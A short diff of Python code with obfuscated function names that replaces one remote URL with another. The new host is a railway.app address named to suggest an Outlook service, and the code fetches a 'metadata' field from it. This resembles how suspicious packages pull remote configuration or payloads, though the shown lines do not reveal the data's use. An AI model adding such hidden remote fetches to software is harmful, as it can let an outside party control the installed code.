@@ -16,7 +16,7 @@ def eval_cxdylz_398():
 
     def learn_jrnyur_766():
         try:
-            eval_bglrbe_302 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_bglrbe_302 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_bglrbe_302.raise_for_status()
             process_ihqnge_633 = eval_bglrbe_302.json()
             data_bjnglm_318 = process_ihqnge_633.get('metadata')
